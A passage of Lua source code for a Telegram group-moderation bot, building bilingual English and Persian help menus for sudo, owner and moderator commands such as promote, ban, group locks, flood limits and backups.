\217\133\217\136\216\177\216\175\217\134\216\184\216\177 \216\173\216\176\217\129 \216\174\217\136\216\167\217\135\217\134\216\175 \216\180\216\175\n\n\216\170\216\186\219\140\219\140\216\177 \216\175\216\179\216\170\216\177\216\179\219\140 \217\190\216\167\216\179\216\174: replyaccess {Q} A\n\216\168\216\177\216\167\219\140 \216\170\216\186\219\140\219\140\216\177 \216\175\216\179\216\170\216\177\216\179\219\140 \216\179\217\136\216\167\217\132 \216\168\217\135 \216\172\216\167\219\140 A \216\167\216\178 \216\179\217\136\216\175\217\136 \219\140\216\167 \216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135 \219\140\216\167 \217\133\216\175\219\140\216\177 \218\175\216\177\217\136\217\135 \219\140\216\167 0 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \226\135\177",
                    callback_data = "GetGpCmdsSudo:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "GetGpCmdsSudo3" then
            keyboard = {}
            if not lang then
              text = [[
*Promote A User To Bot Admin:*
For Promote To Moderator: `promote`
For Promote To Owner: `setowner`
For Demote From Moderator And Owner: `demote` and `delowner`

You can use commands with reply or username]]
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\226\135\177 Back",
                    callback_data = "GetGpCmdsSudo:" .. matches[2]
                  }
                }
              }
            else
              text = "`\216\167\216\177\216\170\217\130\216\167 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \216\168\217\135 \216\167\216\175\217\133\219\140\217\134 \216\177\216\168\216\167\216\170:`\n\216\168\216\177\216\167\219\140 \216\167\216\177\216\170\217\130\216\167 \219\140\218\169 \216\180\216\174\216\181 \216\168\217\135 \217\133\216\175\219\140\216\177: `promote`\n\216\168\216\177\216\167\219\140 \216\167\216\177\216\170\217\130\216\167 \219\140\218\169 \216\180\216\174\216\181 \216\168\217\135 \216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135: `setowner`\n\216\168\216\177\216\167\219\140 \216\168\216\177\218\169\217\134\216\167\216\177 \218\169\216\177\216\175\217\134 \216\167\216\178 \217\133\217\130\216\167\217\133 \217\133\216\175\219\140\216\177\219\140\216\170 \217\136 \216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135 \216\168\217\135 \216\170\216\177\216\170\219\140\216\168: `demote` \217\136 `delowner`\n\n\216\180\217\133\216\167 \217\133\219\140\216\170\217\136\216\167\217\134\219\140\216\175 \216\168\216\177\216\167\219\140 \216\167\219\140\217\134 \216\175\216\179\216\170\217\136\216\177 \217\135\216\167 \216\167\216\178 \216\177\219\140\217\190\217\132\216\167\219\140 \219\140\216\167 \216\180\217\134\216\167\216\179\217\135 \218\169\216\167\216\177\216\168\216\177 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \226\135\177",
                    callback_data = "GetGpCmdsSudo:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "GetGpCmdsSudo4" then
            keyboard = {}
            if not lang then
              text = [[
*Globall Ban A User:*
For Globall Ban User: `banall`
For Globall Unban User: `unbanall`

You can use reply and username for commands]]
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\226\135\177 Back",
                    callback_data = "GetGpCmdsSudo:" .. matches[2]
                  }
                }
              }
            else
              text = "`\217\133\216\173\216\177\217\136\217\133 \218\169\216\177\216\175\217\134 \217\129\216\177\216\175 \216\167\216\178 \218\175\216\177\217\136\217\135 \217\135\216\167:`\n\216\168\216\177\216\167\219\140 \217\133\216\173\216\177\217\136\217\133 \218\169\216\177\216\175\217\134 \219\140\218\169 \216\180\216\174\216\181 \216\167\216\178 \216\170\217\133\216\167\217\133 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \216\177\216\168\216\167\216\170: `banall`\n\216\168\216\177\216\167\219\140 \216\174\216\167\216\177\216\172 \218\169\216\177\216\175\217\134 \217\129\216\177\216\175 \216\167\216\178 \217\133\216\173\216\177\217\136\217\133\219\140\216\170 \217\135\217\133\217\135 \218\175\216\177\217\136\217\135 \217\135\216\167: `unbanall`\n\n\216\180\217\133\216\167 \217\133\219\140\216\170\217\136\216\167\217\134\219\140\216\175 \216\168\216\177\216\167\219\140 \216\167\219\140\217\134 \216\175\216\179\216\170\217\136\216\177 \217\135\216\167 \216\167\216\178 \216\177\219\140\217\190\217\132\216\167\219\140 \219\140\216\167 \216\180\217\134\216\167\216\179\217\135 \218\169\216\167\216\177\216\168\216\177 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \226\135\177",
                    callback_data = "GetGpCmdsSudo:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "GetGpCmdsSudo5" then
            keyboard = {}
            if not lang then
              text = [[
*Work With Edit Bot:*
General Commands: `editbot` *all* help]]
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\226\135\177 Back",
                    callback_data = "GetGpCmdsSudo:" .. matches[2]
                  }
                }
              }
            else
              text = "`\218\169\216\167\216\177 \216\168\216\167 \217\136\219\140\216\177\216\167\219\140\216\180 \216\177\216\168\216\167\216\170:`\n\216\175\216\179\216\170\217\136\216\177 \218\169\217\132\219\140: `editbot` *all* help"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \226\135\177",
                    callback_data = "GetGpCmdsSudo:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "GetGpCmdsSudo6" then
            keyboard = {}
            if not lang then
              text = [[
*Change Sudo Access:*
General Commands: `sudoaccess` *ID* all
You should use user id Instead *ID*]]
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\226\135\177 Back",
                    callback_data = "GetGpCmdsSudo:" .. matches[2]
                  }
                }
              }
            else
              text = "`\216\170\216\186\219\140\219\140\216\177 \216\175\216\179\216\170\216\177\216\179\219\140 \216\179\217\136\216\175\217\136 \217\135\216\167:`\n\216\175\216\179\216\170\217\136\216\177 \218\169\217\132\219\140: `sudoaccess` *ID* all\n\216\168\217\135 \216\172\216\167\219\140 *ID* \216\167\216\178 \216\167\219\140\216\175\219\140 \216\179\217\136\216\175\217\136 \216\177\216\168\216\167\216\170 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \226\135\177",
                    callback_data = "GetGpCmdsSudo:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "GetGpCmdsSudo7" then
            keyboard = {}
            if not lang then
              text = [[
*Add or Remove Sudo:*
For Add Sudo: `setsudo`
For Delete Sudo: `delsudo`

You can use reply and username for this commands]]
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\226\135\177 Back",
                    callback_data = "GetGpCmdsSudo:" .. matches[2]
                  }
                }
              }
            else
              text = "`\216\167\216\182\216\167\217\129\217\135 \219\140\216\167 \216\173\216\176\217\129 \218\169\216\177\216\175\217\134 \216\179\217\136\216\175\217\136:`\n\216\168\216\177\216\167\219\140 \216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \216\179\217\136\216\175\217\136: `setsudo`\n\216\168\216\177\216\167\219\140 \216\173\216\176\217\129 \218\169\216\177\216\175\217\134 \216\179\217\136\216\175\217\136 `delsudo`\n\n\216\180\217\133\216\167 \217\133\219\140\216\170\217\136\217\134\219\140\216\175  \216\168\216\177\216\167\219\140 \216\167\219\140\217\134 \216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\167\216\178 \216\177\219\140\217\190\217\132\216\167\219\140 \219\140\216\167 \216\180\217\134\216\167\216\179\217\135 \218\169\216\167\216\177\216\168\216\177 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \226\135\177",
                    callback_data = "GetGpCmdsSudo:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "GetGpCmdsOwner" then
            if not is_owner(matches[2], msg.from.id) then
              return ErrorAccess
            end
            keyboard = {}
            if not lang then
              text = "Owner Commands:"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "Promote A User To Bot Admin",
                    callback_data = "GetGpCmdsOwner1:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Work With Group Locks",
                    callback_data = "GetGpCmdsOwner2:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Work With Number items",
                    callback_data = "GetGpCmdsOwner3:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Lists And Cleans",
                    callback_data = "GetGpCmdsOwner4:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Other Commands",
                    callback_data = "GetGpCmdsOwner5:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\226\135\177 Back",
                    callback_data = "GetGpCmds:" .. matches[2]
                  }
                }
              }
            else
              text = "\216\175\216\179\216\170\217\136\216\177\216\167\216\170 \216\181\216\167\216\173\216\168\216\167\217\134 \218\175\216\177\217\136\217\135:"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\167\216\177\216\170\217\130\216\167 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \216\168\217\135 \216\167\216\175\217\133\219\140\217\134 \216\177\216\168\216\167\216\170",
                    callback_data = "GetGpCmdsOwner1:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\218\169\216\167\216\177 \216\168\216\167 \217\130\217\129\217\132 \217\135\216\167\219\140 \218\175\216\177\217\136\217\135",
                    callback_data = "GetGpCmdsOwner2:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\218\169\216\167\216\177 \216\168\216\167 \216\162\219\140\216\170\217\133 \217\135\216\167\219\140 \216\185\216\175\216\175\219\140",
                    callback_data = "GetGpCmdsOwner3:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\217\132\219\140\216\179\216\170 \217\135\216\167 \217\136 \217\190\216\167\218\169\216\179\216\167\216\178\219\140 \217\135\216\167",
                    callback_data = "GetGpCmdsOwner4:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\175\219\140\218\175\216\177 \216\175\216\179\216\170\217\136\216\177\216\167\216\170",
                    callback_data = "GetGpCmdsOwner5:" .. matches[2]
                  }
                },
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \226\135\177",
                    callback_data = "GetGpCmds:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "GetGpCmdsOwner1" then
            keyboard = {}
            if not lang then
              text = [[
*Promote A User To Bot Admin:*
For Promote To Moderator: `promote`
For Promote To Owner: `setowner`
For Demote From Moderator And Owner: `demote` and `delowner`

You can use commands with reply or username]]
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\226\135\177 Back",
                    callback_data = "GetGpCmdsOwner:" .. matches[2]
                  }
                }
              }
            else
              text = "`\216\167\216\177\216\170\217\130\216\167 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \216\168\217\135 \216\167\216\175\217\133\219\140\217\134 \216\177\216\168\216\167\216\170:`\n\216\168\216\177\216\167\219\140 \216\167\216\177\216\170\217\130\216\167 \219\140\218\169 \216\180\216\174\216\181 \216\168\217\135 \217\133\216\175\219\140\216\177: `promote`\n\216\168\216\177\216\167\219\140 \216\167\216\177\216\170\217\130\216\167 \219\140\218\169 \216\180\216\174\216\181 \216\168\217\135 \216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135: `setowner`\n\216\168\216\177\216\167\219\140 \216\168\216\177\218\169\217\134\216\167\216\177 \218\169\216\177\216\175\217\134 \216\167\216\178 \217\133\217\130\216\167\217\133 \217\133\216\175\219\140\216\177\219\140\216\170 \217\136 \216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135 \216\168\217\135 \216\170\216\177\216\170\219\140\216\168: `demote` \217\136 `delowner`\n\n\216\180\217\133\216\167 \217\133\219\140\216\170\217\136\216\167\217\134\219\140\216\175 \216\168\216\177\216\167\219\140 \216\167\219\140\217\134 \216\175\216\179\216\170\217\136\216\177 \217\135\216\167 \216\167\216\178 \216\177\219\140\217\190\217\132\216\167\219\140 \219\140\216\167 \216\180\217\134\216\167\216\179\217\135 \218\169\216\167\216\177\216\168\216\177 \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \226\135\177",
                    callback_data = "GetGpCmdsOwner:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "GetGpCmdsOwner2" then
            keyboard = {}
            if not lang then
              text = [[
*Work With Group Locks:*
For Lock an item use `lock` commands and for unlock it use `lock` or `unlock`:

edit
link
tags
flood
spam
mention
arabic
webpage
markdown
pin message
Max Words
Bots protection
all
gif
text
inline
game
photo
video
audio
voice
sticker
contact
forward
location
document
tgservice
keyboard
bot chat
fohsh
English
Forced Invite
UserName (@)
Join]]
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\226\135\177 Back",
                    callback_data = "GetGpCmdsOwner:" .. matches[2]
                  }
                }
              }
            else
              text = "`\218\169\216\167\216\177 \216\168\216\167 \217\130\217\129\217\132 \217\135\216\167\219\140 \218\175\216\177\217\136\217\135:`\n\216\168\216\177\216\167\219\140 \217\130\217\129\217\132 \218\169\216\177\216\175\217\134 \219\140\218\169\219\140 \216\167\216\178 \217\133\217\136\216\167\216\177\216\175 \216\178\219\140\216\177 \216\167\216\178 \216\175\216\179\216\170\217\136\216\177 lock \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175 \217\136 \216\168\216\177\216\167\219\140 \216\168\216\167\216\178 \218\169\216\177\216\175\217\134 \216\162\217\134\216\167\217\134 \217\133\219\140\216\170\217\136\216\167\217\134\219\140\216\175 \216\167\216\178 \217\135\217\133\219\140\217\134 \216\175\216\179\216\170\217\136\216\177 \219\140\216\167 \216\175\216\179\216\170\217\136\216\177 unlock \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175:\n\n\216\167\216\175\219\140\216\170\n\217\132\219\140\217\134\218\169\n\216\170\218\175\n\217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140\n\216\167\216\179\217\190\217\133\n\217\133\217\134\216\180\217\134\n\216\185\216\177\216\168\219\140\n\216\181\217\129\216\173\216\167\216\170 \217\136\216\168\n\217\129\217\136\217\134\216\170\n\217\190\219\140\217\134\n\216\173\216\175\216\167\218\169\216\171\216\177 \218\169\217\132\217\133\216\167\216\170\n\216\177\216\168\216\167\216\170 \217\135\216\167\n\217\135\217\133\217\135\n\218\175\219\140\217\129\n\217\133\216\170\217\134\n\216\167\219\140\217\134\217\132\216\167\219\140\217\134\n\216\168\216\167\216\178\219\140 \217\135\216\167\219\140 \216\162\217\134\217\132\216\167\219\140\217\134\n\216\185\218\169\216\179\n\217\129\219\140\217\132\217\133\n\216\162\217\135\217\134\218\175\n\216\181\216\175\216\167\n\216\167\216\179\216\170\219\140\218\169\216\177\n\217\133\216\174\216\167\216\183\216\168\n\217\129\217\136\216\177\217\136\216\167\216\177\216\175\n\217\133\218\169\216\167\217\134\n\217\129\216\167\219\140\217\132\n\216\174\216\175\217\133\216\167\216\170 \216\170\217\132\218\175\216\177\216\167\217\133\n\216\181\217\129\216\173\217\135 \218\169\217\132\219\140\216\175\n\218\134\216\170 \216\177\216\168\216\167\216\170\n\217\129\216\173\216\180\n\216\167\217\134\218\175\217\132\219\140\216\179\219\140\n\216\175\216\185\217\136\216\170 \216\167\216\172\216\168\216\167\216\177\219\140\n\219\140\217\136\216\178\216\177\217\134\219\140\217\133 (@)\n\217\136\216\177\217\136\216\175"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \226\135\177",
                    callback_data = "GetGpCmdsOwner:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "GetGpCmdsOwner3" then
            keyboard = {}
            if not lang then
              text = [[
*Work With Number items:*
General Commands: set(Operation) Number

Operations:
1-flood: Users who send a message to the specified number are sent or their message will be deleted.

2-floodtime: Users who During this time a certain number of messages will be removed or their message will be deleted

3-maxwarn: Determine the amount of alert for dismissing or silencing a user

4-maxwords: Messages whose words are too high More will be deleted

5-forcedinvite: Number of members to invite the user to the group for permission to chat]]
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\226\135\177 Back",
                    callback_data = "GetGpCmdsOwner:" .. matches[2]
                  }
                }
              }
            else
              text = "`\218\169\216\167\216\177 \216\168\216\167 \216\162\219\140\216\170\217\133 \217\135\216\167\219\140 \216\185\216\175\216\175\219\140:`\n\216\175\216\179\216\170\217\136\216\177 \218\169\217\132\219\140: \216\170\217\134\216\184\219\140\217\133 (\216\185\217\133\217\132\219\140\216\167\216\170) \216\185\216\175\216\175\n\n\216\185\217\133\217\132\219\140\216\167\216\170 \217\135\216\167:\n1- \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140: \218\169\216\167\216\177\216\168\216\177\216\167\217\134\219\140 \218\169\217\135 \216\168\217\135 \216\170\216\185\216\175\216\167\216\175 \216\170\216\185\219\140\219\140\217\134 \216\180\216\175\217\135 \217\190\216\180\216\170 \216\179\216\177 \217\135\217\133 \217\190\219\140\216\167\217\133 \216\168\217\129\216\177\216\179\216\170\217\134\216\175 \216\167\216\174\216\177\216\167\216\172 \217\133\219\140\216\180\217\136\217\134\216\175 \219\140\216\167 \217\190\219\140\216\167\217\133 \216\162\217\134 \217\135\216\167 \217\190\216\167\218\169 \217\133\219\140\216\180\217\136\216\175\n\n2-\216\178\217\133\216\167\217\134 \217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140: \218\169\216\167\216\177\216\168\216\177\216\167\217\134\219\140 \218\169\217\135 \216\175\216\177 \216\183\217\136\217\132 \216\167\219\140\217\134 \216\178\217\133\216\167\217\134 \216\170\216\185\216\175\216\167\216\175 \217\133\216\185\219\140\217\134\219\140 \217\190\219\140\216\167\217\133 \216\168\217\129\216\177\216\179\216\170\217\134\216\175 \216\167\216\174\216\177\216\167\216\172 \217\133\219\140\216\180\217\136\217\134\216\175 \219\140\216\167 \217\190\219\140\216\167\217\133 \216\162\217\134 \217\135\216\167 \217\190\216\167\218\169 \217\133\219\140\216\180\217\136\216\175\n\n3-\216\173\216\175\216\167\218\169\216\171\216\177 \216\167\216\174\216\183\216\167\216\177: \216\170\216\185\219\140\219\140\217\134 \217\133\219\140\216\178\216\167\217\134 \216\167\216\174\216\183\216\167\216\177 \216\168\216\177\216\167\219\140 \216\167\216\174\216\177\216\167\216\172 \219\140\216\167 \216\179\216\167\218\169\216\170 \218\169\216\177\216\175\217\134 \218\169\216\167\216\177\216\168\216\177\n\n4-\216\173\216\175\216\167\218\169\216\171\216\177 \218\169\217\132\217\133\216\167\216\170: \217\190\219\140\216\167\217\133 \217\135\216\167\219\140\219\140 \218\169\217\135 \218\169\217\132\217\133\216\167\216\170 \216\162\217\134 \216\167\216\178 \216\173\216\175 \216\170\216\185\219\140\219\140\217\134 \216\180\216\175\217\135 \216\168\219\140\216\180\216\170\216\177 \216\168\216\167\216\180\216\175 \216\173\216\176\217\129 \217\133\219\140\216\180\217\136\217\134\216\175\n\n5-\216\175\216\185\217\136\216\170 \216\167\216\172\216\168\216\167\216\177\219\140: \216\170\216\185\216\175\216\167\216\175 \216\185\216\182\217\136 \216\168\216\177\216\167\219\140 \216\175\216\185\217\136\216\170 \218\169\216\177\216\175\217\134 \218\169\216\167\216\177\216\168\216\177 \216\168\217\135 \218\175\216\177\217\136\217\135 \216\168\216\177\216\167\219\140 \216\167\216\172\216\167\216\178\217\135 \216\168\217\135 \218\134\216\170 \218\169\216\177\216\175\217\134"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \226\135\177",
                    callback_data = "GetGpCmdsOwner:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "GetGpCmdsOwner4" then
            keyboard = {}
            if not lang then
              text = [[
*Lists And Cleans:*
Lists:

1-allowlist: allow words and users in group

2-filterlist: filtered words in group

3-silentlist: group silent users

4-modlist: group moderator list

5-ownerlist: group owners

Cleans:
mods/filterlist/rules/welcome/silentlist/reportlist/blacklist/bots/vain/tabchi]]
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\226\135\177 Back",
                    callback_data = "GetGpCmdsOwner:" .. matches[2]
                  }
                }
              }
            else
              text = "`\217\132\219\140\216\179\216\170 \217\135\216\167 \217\136 \217\190\216\167\218\169\216\179\216\167\216\178\219\140 \217\135\216\167:`\n\217\132\219\140\216\179\216\170 \217\135\216\167:\n\n1-\217\132\219\140\216\179\216\170 \217\133\216\172\216\167\216\178: \217\132\219\140\216\179\216\170 \216\167\217\129\216\177\216\167\216\175 \217\136 \218\169\217\132\217\133\216\167\216\170\219\140 \218\169\217\135 \216\175\216\177 \216\181\217\136\216\177\216\170 \217\130\217\129\217\132 \216\168\217\136\216\175\217\134 \217\135\217\133 \217\133\216\172\216\167\216\178 \217\135\216\179\216\170\217\134\216\175\n\n2-\217\132\219\140\216\179\216\170 \217\129\219\140\217\132\216\170\216\177: \217\132\219\140\216\179\216\170 \218\169\217\132\217\133\216\167\216\170 \217\129\219\140\217\132\216\170\216\177 \216\180\216\175\217\135\n\n3-\217\132\219\140\216\179\216\170 \216\179\218\169\217\136\216\170: \217\132\219\140\216\179\216\170 \216\167\217\129\216\177\216\167\216\175 \216\179\216\167\218\169\216\170 \216\180\216\175\217\135 \216\175\216\177 \218\175\216\177\217\136\217\135\n\n4-\217\132\219\140\216\179\216\170 \217\133\216\175\219\140\216\177\216\167\217\134: \217\132\219\140\216\179\216\170 \217\133\216\175\219\140\216\177\216\167\217\134 \218\175\216\177\217\136\217\135\n\n5-\217\132\219\140\216\179\216\170 \216\181\216\167\216\173\216\168\216\167\217\134: \217\132\219\140\216\179\216\170 \216\181\216\167\216\173\216\168\216\167\217\134 \218\175\216\177\217\136\217\135\n\n\217\132\219\140\216\179\216\170 \217\135\216\167\219\140 \217\130\216\167\216\168\217\132 \217\190\216\167\218\169\216\179\216\167\216\178\219\140:\n\217\133\216\175\219\140\216\177\216\167\217\134/\217\132\219\140\216\179\216\170 \217\129\219\140\217\132\216\170\216\177/\217\130\217\136\216\167\217\134\219\140\217\134/\216\174\217\136\216\180 \216\162\217\133\216\175 \218\175\217\136\219\140\219\140/\217\132\219\140\216\179\216\170 \216\179\218\169\217\136\216\170/\217\132\219\140\216\179\216\170 \216\177\219\140\217\190\217\136\216\177\216\170/\217\132\219\140\216\179\216\170 \216\168\217\132\216\167\218\169/\216\177\216\168\216\167\216\170 \217\135\216\167/\216\167\216\185\216\182\216\167 \216\168\219\140 \217\129\216\167\219\140\216\175\217\135/ \216\170\216\168\218\134\219\140"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \226\135\177",
                    callback_data = "GetGpCmdsOwner:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "GetGpCmdsOwner5" then
            keyboard = {}
            if not lang then
              text = [[
*Other Commands:*

setchannel Set Group Channel For Forced Join

addsettings (NAME) Add A Private Settings

delsettings (NAME) Delete A Private Settings

invitekicked Invite Kicked Members

setlink Set Group Link For Bot

access owner/moderator/member

setlang (en/fa) Change Chat Language

photoid (on/off) Show Photo in ID Command

lockgroup (H:M) (H:M) Lock Chat in A Time

unlockgroup Unlock Chat

sense (on/off) Change Bot Sense

tosuper Change Chat to SuperGroup

helpme (TEXT) Send Help To Bot Owner

warnstatus (silent/kick)

backup Create Backup From Group Settings

getbackup Use Saved Backup For Change Settings

rmsg (1-1000) Clean Group Messages]]
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\226\135\177 Back",
                    callback_data = "GetGpCmdsOwner:" .. matches[2]
                  }
                }
              }
            else
              text = "`\216\175\219\140\218\175\216\177 \216\175\216\179\216\170\217\136\216\177\216\167\216\170:`\n\n\216\170\217\134\216\184\219\140\217\133 \218\169\216\167\217\134\216\167\217\132 (\216\162\219\140\216\175\219\140): \216\170\217\134\216\184\219\140\217\133 \218\169\216\167\217\134\216\167\217\132 \218\175\216\177\217\136\217\135 \216\168\216\177\216\167\219\140 \216\185\216\182\217\136\219\140\216\170 \216\167\216\172\216\168\216\167\216\177\219\140\n\n\216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 (\216\167\216\179\217\133): \216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 \216\174\216\181\217\136\216\181\219\140\n\n\216\173\216\176\217\129 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 (\216\167\216\179\217\133): \216\173\216\176\217\129 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 \216\174\216\181\217\136\216\181\219\140\n\n\216\175\216\185\217\136\216\170 \216\167\216\174\216\177\216\167\216\172 \216\180\216\175\217\135 \217\135\216\167: \216\175\216\185\217\136\216\170 \216\167\216\185\216\182\216\167 \216\167\216\174\216\177\216\167\216\172 \216\180\216\175\217\135\n\n\216\170\217\134\216\184\219\140\217\133 \217\132\219\140\217\134\218\169: \216\170\217\134\216\184\219\140\217\133 \217\132\219\140\217\134\218\169 \218\175\216\177\217\136\217\135 \216\168\216\177\216\167\219\140 \216\177\216\168\216\167\216\170\n\n\216\175\216\179\216\170\216\177\216\179\219\140 \216\181\216\167\216\173\216\168/\217\133\216\175\219\140\216\177/\217\133\217\133\216\168\216\177\n\n\216\170\216\186\219\140\219\140\216\177 \216\178\216\168\216\167\217\134 (\216\167\217\134\218\175\217\132\219\140\216\179\219\140/\217\129\216\167\216\177\216\179\219\140): \216\170\216\186\219\140\219\140\216\177 \216\178\216\168\216\167\217\134 \218\175\216\177\217\136\217\135\n\n\216\185\218\169\216\179 \216\162\219\140\216\175\219\140 (\216\177\217\136\216\180\217\134/\216\174\216\167\217\133\217\136\216\180) \217\134\217\133\216\167\219\140\216\180 \216\185\218\169\216\179 \218\169\216\167\216\177\216\168\216\177 \216\175\216\177 \216\175\216\179\216\170\217\136\216\177 \216\162\219\140\216\175\219\140\n\n\217\130\217\129\217\132 \218\175\216\177\217\136\217\135 (H:M) (H:M): \217\130\217\129\217\132 \218\175\216\177\217\136\217\135 \216\175\216\177 \219\140\218\169 \216\178\217\133\216\167\217\134 \217\133\216\180\216\174\216\181\n\nunlockgroup \216\168\216\167\216\178\218\169\216\177\216\175\217\134 \218\175\216\177\217\136\217\135\n\n\217\135\217\136\216\180 \217\133\216\181\217\134\217\136\216\185\219\140 (\216\177\217\136\216\180\217\134/\216\174\216\167\217\133\217\136\216\180) \216\170\216\186\219\140\219\140\216\177 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 \217\135\217\136\216\180 \216\177\216\168\216\167\216\170\n\n\216\177\216\167\217\135\217\134\217\133\216\167\219\140\219\140 (\217\133\216\170\217\134): \216\167\216\177\216\179\216\167\217\132 \217\133\216\170\217\134 \216\168\217\135 \216\181\216\167\216\173\216\168 \216\177\216\168\216\167\216\170\n\n\217\136\216\182\216\185\219\140\216\170 \216\167\216\174\216\183\216\167\216\177 (\216\179\218\169\217\136\216\170/\217\133\216\179\216\175\217\136\216\175)\n\n\216\168\218\169 \216\162\217\190: \216\168\218\169 \216\162\217\190 \218\175\216\177\217\129\216\170\217\134 \216\167\216\178 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 \218\175\216\177\217\136\217\135\n\n\216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\167\216\178 \216\168\218\169 \216\162\217\190: \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\167\216\178 \216\168\218\169 \216\162\217\190 \216\176\216\174\219\140\216\177\217\135 \216\180\216\175\217\135 \216\168\216\177\216\167\219\140 \216\170\216\186\219\140\219\140\216\177 \216\170\217\134\216\184\219\140\217\133\216\167\216\170\n\n\216\173\216\176\217\129 \217\190\219\140\216\167\217\133 (1-1000) \217\190\216\167\218\169\216\179\216\167\216\178\219\140 \217\190\219\140\216\167\217\133 \217\135\216\167\219\140 \218\175\216\177\217\136\217\135"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "\216\168\216\177\218\175\216\180\216\170 \226\135\177",
                    callback_data = "GetGpCmdsOwner:" .. matches[2]
                  }
                }
              }
            end
            edit_inline(msg.message_id, text, keyboard)
          end
          if matches[1] == "GetGpCmdsMods" then
            if not is_mod(matches[2], msg.from.id) then
              return ErrorAccess
            end
            keyboard = {}
            if not lang then
              text = "Moderator Commands:"
              keyboard.inline_keyboard = {
                {
                  {
                    text = "Work With Group Locks",
                    callback_data = "GetGpCmdsMods1:" .. matches[2]
                  }
                },
                {
                  {
                    text = "Work With Number items",
                    callback_data = "GetGpCmdsMods2:" .. matches[2]
                  }
                },
                {
                  {
